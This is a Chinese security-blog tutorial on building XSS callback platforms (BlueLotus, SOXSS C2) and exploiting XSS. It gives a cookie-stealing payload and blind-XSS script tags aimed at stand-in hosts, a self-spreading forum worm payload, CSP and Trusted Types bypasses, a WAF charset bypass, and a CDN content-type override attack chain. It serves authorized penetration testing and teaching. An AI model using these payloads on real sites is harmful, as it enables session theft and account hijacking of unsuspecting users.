---
title: XSS平台搭建与实战利用：从BlueLotus部署到绕过CSP和Trusted Types
url: https://mp.weixin.qq.com/s/n0wdU39nPGRm2eOPB7vVRw
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:25:35.799091
---

# XSS平台搭建与实战利用：从BlueLotus部署到绕过CSP和Trusted Types

# XSS平台搭建与实战利用：从BlueLotus部署到绕过CSP和Trusted Types

原创

KLSEC
KLSEC

昆仑AI安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

2026年7月，某SRC平台披露了一个让人眼前一亮的存储型XSS案例。攻击者在上传文件时，服务端正确限制了后缀、检查了文件头、强制写入了`Content-Type: image/png`。上传阶段的防护看起来滴水不漏。但当用户访问这个文件时，请求的URL中多了一个参数：`?response-content-type=text/html`。文件内容没变，路径没变，只是多了一个参数。浏览器看到的响应头从`image/png`变成了`text/html`，于是它不再把这份内容当图片，而是尝试按HTML页面处理。藏在上传内容里的JS片段被触发，在CDN域名下执行了任意JavaScript。

这个案例的精髓不在XSS本身，在于它揭示了一个事实：**2026年的XSS攻击，已经不再只是“有没有过滤”的问题，而是“过滤的假设是否成立”的问题。**

今天这篇文章，把XSS平台搭建、Payload构造、绕过现代防护的完整链路拆开。从BlueLotus部署到Trusted Types绕过，每一步都有具体命令和实战案例。

**一、为什么你需要一个自己的XSS平台**

做XSS测试的人有一个共同的痛点：你注入了一个Payload，但它什么时候被触发、被谁触发、触发后拿到了什么数据，你完全不知道。

Burp Collaborator和Interactsh能告诉你“有东西回来了”，但它们不会告诉你**具体是哪个注入点触发了Payload**。当你在一个表单里填了昵称、个人简介、客服工单、管理员备注、账单地址、内部评论六个字段，每个字段都注入了Payload，后来收到了一个回调，你根本不知道是哪个字段触发的。

自建XSS平台解决的就是这个问题。它给你一个独立的回调地址，你可以为每个注入点生成一个唯一的Payload路径。当Payload被触发时，平台会记录触发的来源URL、IP地址、User-Agent、Cookie等信息，让你清楚地知道“是管理员后台的客服工单字段触发了这个Payload”。

**二、BlueLotus XSS平台部署：三种方案**

BlueLotus是清华大学蓝莲花战队的开源XSS平台，轻量级、无需数据库（数据存储在文件中），是新手入门的最佳选择。

**方案一：PHPStudy一键部署（Windows，最简单）**

下载PHPStudy V8.1或更新版本，安装后启动Apache和MySQL。从GitHub下载BlueLotus源码包：

```
git clone https://github.com/asw3asw/BlueLotus_XSSReceiver
```

将解压后的文件夹放到PHPStudy的`WWW`目录下。然后赋予数据存储目录写权限：

```
chmod 777 -R ./BlueLotus_XSSReceiver
```

浏览器访问`http://localhost/BlueLotus_XSSReceiver/install.php`，进入安装配置界面。按照向导填写数据库信息（如果不需要数据库存储，可以跳过），设置管理员密码。

安装完成后，将`config-sample.php`改名为`config.php`，删除`install.php`防止重复安装。访问`http://localhost/BlueLotus_XSSReceiver/login.php`，用默认密码登录后台。

**方案二：Docker部署（Linux，最干净）**

GitHub上的XSS-Platform项目提供了Docker Compose一键部署方案：

```
git clone https://github.com/Moxin1044/XSS-Platformcd XSS-Platformdocker-compose up -d
```

这个方案自动配置PHP 8.1 + MySQL 8.0环境，使用南京大学镜像源加速构建，数据持久化存储，包含phpMyAdmin管理界面。主应用访问地址是`http://localhost:8080`，数据库管理是`http://localhost:8081`。默认管理员账户是`admin/admin123`，登录后必须立即修改默认密码。

**方案三：SOXSS（WebSocket C2架构，最现代）**

如果你需要更现代的XSS利用方式，SOXSS是一个基于WebSocket的C2平台。它不像传统平台那样靠HTTP轮询，而是为每个受害者会话维护一条加密的WebSocket通道，操作员可以在本地Web控制台实时下发命令、查看输出、截图、甚至建立MITM代理。

部署方式：

```
git clone https://github.com/CTPache/SOXSScd SOXSSpython -m venv .venvsource .venv/bin/activate  # Windows: .\.venv\Scripts\Activate.ps1pip install -r requirements.txtpython Socxss.py
```

启动后，Payload服务器运行在`http://0.0.0.0:8000/`，WebSocket C2运行在`ws://0.0.0.0:8765/<sid>`，操作台在`http://127.0.0.1:8002/index.html`。所有默认配置在`config.py`中，也可以通过命令行参数覆盖，比如`python Socxss.py --PUBLIC_HTTP_HOST attacker.example --PUBLIC_WS_HOST attacker.example`。

**三、XSS Payload构造：从弹窗到武器化**

平台搭好了，接下来是Payload。2026年的XSS Payload构造已经不再只是`<script>alert(1)</script>`。你需要根据注入点的上下文，选择合适的Payload。

**基础检测Payload。**

```
<script>alert(document.domain)</script><img src=x onerror=alert(1)><svg onload=alert(1)>
```

这些Payload的作用是快速验证“注入是否成功”。如果弹出了域名，说明XSS存在。

**Cookie窃取Payload。**

```
<script>new Image().src="https://your-xss-platform.com/c?c="+document.cookie</script>
```

这个Payload在目标浏览器中创建一个Image对象，向你的平台发送一个请求，把Cookie作为参数带回来。

**盲打Payload（Blind XSS）。**

盲打Payload适用于那些你不会立即看到结果的注入点——管理员后台、客服工单、日志查看器。XSSTrace平台的做法是：为每个注入点生成一个唯一的marker路径。

```
<script src="https://xss.yourdomain.com/x/signup-name"></script><script src="https://xss.yourdomain.com/x/admin-note"></script><script src="https://xss.yourdomain.com/x/support-ticket"></script>
```

`/x/`后面的内容就是marker。当Payload被触发时，平台会告诉你“是`admin-note`这个marker触发了”。

**XSS蠕虫Payload。**

这是一个论坛站点的实战案例。攻击者构造了一个Payload，利用`href`属性在受害者点击时自动触发`fetch`请求发布新帖子：

```
javascript:(function(){  fetch('https://target.com/v1/question',{    method:'POST',    headers:{'Content-Type':'application/json'},    body:JSON.stringify({      title:'点击领取奖励',      content:'<p><a href=\\'javascript:alert(document.cookie)\\'>点击领取奖励</a></p>',      tags:[{original_text:'',parsed_text:'',tag_id:'1111',slug_name:'other',display_name:'其他'}]    })  });})();void(0);
```

当受害者点击链接时，他们的账号会自动创建一个新帖子，帖子内容又包含同样的Payload。每一个访问并点击的人都成为了传播节点。这个XSS蠕虫最终为攻击者赢得了380美元的赏金。

**四、绕过现代防护：CSP和Trusted Types**

2026年，越来越多的应用部署了CSP和Trusted Types。传统的内联脚本注入被阻断，但这不意味着XSS无法利用。

**Trusted Types绕过：XSLTProcessor漏洞。**

Firefox的`XSLTProcessor.transformToFragment()`存在一个Trusted Types绕过漏洞，编号Bug 2046715。当XSLT样式表包含`<xsl:copy-of select="..."/>`时，从源XML文档复制的节点（包括它们的属性）会被直接创建在owner document的上下文中，**不经过Trusted Types的sink强制检查**。

这意味着：只要应用使用了XSLTProcessor处理攻击者可控的XML数据，攻击者就可以在XML中注入事件处理器属性（如`onerror`、`ontoggle`），当这些节点被append到DOM时，事件处理器自动执行。应用部署了Trusted Types，但Trusted Types根本没有拦截这些节点，因为它们不是通过`innerHTML`、`insertAdjacentHTML`或`script.textContent`创建的。

攻击场景很具体：RSS阅读器、XML数据展示页面、文档处理器、CMS模板系统——任何使用XSLT渲染攻击者可控XML数据的应用，即使部署了Trusted Types，仍然存在DOM XSS风险。攻击者只需要控制XML数据，不需要控制XSLT模板本身。

**CSP Nonce泄漏：CSS注入+浏览器缓存。**

2026年的Advanced XSS研究揭示了一种新的CSP绕过路径：通过CSS注入泄漏CSP nonce值。应用通过`<style>`标签动态注入CSS，且CSS内容部分可控时，攻击者可以利用CSS选择器和属性选择器，逐个字符地“猜测”nonce值。结合浏览器缓存的时间侧信道，攻击者可以在几分钟内还原出完整的nonce。拿到nonce后，内联脚本的CSP防护就失效了。

**OWASP CRS编码绕过。**

2026年1月披露的OWASP CRS漏洞（CVE-2026-21876）允许攻击者通过编码技巧绕过WAF规则。规则922110在遍历所有multipart部件后，仅检查最后一个部件的字符集。攻击者将恶意Payload隐藏在合法字符集部件之前，WAF检测整体绕过。修复方案是升级到CRS 4.22.0或3.3.8，并将接受的字符编码限制为UTF-8，拒绝UTF-7等替代编码。

**五、自动化工具：从手工到流水线**

手工构造Payload效率太低。2026年有几款自动化工具值得关注。

**QuickXSS**——将waybackurls、gau、gf和dalfox串联起来，自动化XSS发现流程：

```
pip install quickxssquickxss setup --installquickxss scan -d testphp.vulnweb.com -b blind.xss.ht
```

`-b`参数指定盲打回调地址。扫描结果保存在`results/<domain>/`目录下，包含原始URL集合、候选测试URL和Dalfox发现结果。

**StingXSS**——上下文感知的XSS扫描器，支持反射型、DOM型、存储型、盲打XSS，内置WAF绕过、CRLF注入、XST和PoC生成。不需要Burp许可证。

**SM0G-XSS**——支持反射、DOM、存储、盲打、Header注入、路径注入、CRLF、开放重定向、GraphQL和WebSocket XSS。带无头浏览器验证和WAF绕过能力。

**六、实战案例：从对象存储到CDN域名存储型XSS**

回到开头那个案例，把完整攻击链拆开。

**第一步：发现上传点。** 目标是一个用户头像上传功能，文件被存储在MinIO对象存储中，通过CDN域名`cdn.target.com`对外提供访问。

**第二步：分析响应头。** 正常访问上传的文件：

```
curl -I "https://cdn.target.com/uploads/avatar123.png"
```

返回`Content-Type: image/png`。但MinIO支持response header override参数。尝试：

```
curl -I "https://cdn.target.com/uploads/avatar123.png?response-content-type=text/html"
```

返回`Content-Type: text/html`。这意味着读取阶段的类型被攻击者控制了。

**第三步：构造恶意文件。** 上传一个内容为HTML的“图片”文件。上传阶段的防护只检查了文件头和后缀，没有检查文件内容是否包含HTML标签。

**第四步：诱导访问。** 构造URL`https://cdn.target.com/uploads/avatar123.png?response-content-type=text/html`，发送给受害者。由于域名是目标的合法CDN域名，受害者的浏览器认为这是可信来源，加载了HTML内容并执行了其中的JavaScript。

**第五步：影响评估。** 这个XSS运行在`cdn.target.com`域下，可以读取该域下的Cookie、执行同源操作、向目标服务器发起携带受害者凭证的请求。由于CDN域名通常配置了宽松的CORS策略，影响范围可能扩展到主站。

AWS S3也有类似功能，但匿名GET请求不能直接使用response header override参数，会返回“Request specific response headers cannot be used for anonymous GET requests”。但如果对象本身是公开可读的，授权测试时可以继续检查预签名URL是否允许这些参数。

**写在最后**

2026年的XSS攻击，已经从一个“过滤与绕过”的游戏，变成了一个“信任边界”的游戏。

BlueLotus和SOXSS让你能捕获Payload的触发，Trusted Types绕过让你能在最严格的防护下执行代码，对象存储的Content-Type覆盖让你能在CDN域名下注入HTML。每一个环节都在说明同一件事：**防护的假设不成立，攻击就成立。**

Trusted Types假设所有脚本能力DOM变更都经过policy检查，但XSLTProcessor说“我直接复制节点，不走你的sink”。CSP假设内联脚本被阻断后攻击者无法执行代码，但CSS注入和缓存侧信道说“我可以偷你的nonce”。上传防护假设“我检查了文件头和Content-Type，文件是安全的”，但对象存储的response header override说“读取阶段的类型由我控制”。

下次你审一个XSS候选点时，不要只问“有没有过滤”。问自己三个问题：**过滤依赖什么假设？这个假设在当前环境中是否成立？如果不成立，攻击链的起点在哪里？**

**严正声明**

本文所述所有技术内容仅用于**已获得明确书面授权**的安全测试、研究和教育场景。XSS平台应部署在隔离网络中，禁止将平台暴露在公网。所有Payload和攻击链描述均基于公开漏洞报告和授权测试案例。未授权扫描、测试、攻击行为违反《中华人民共和国网络安全法》第27条及《刑法》第285条，将承担法律责任。技术无罪，边界是法律。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3oR6eMARh6zL8x37G6prKFHZF4gTaajT0RYoRj81C6Rod7btfah6ZiaFaxIibKsVXNU7SMqnZia2FOtCYLFFgMor803P3ysbiba9ruW8LoMzjQw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过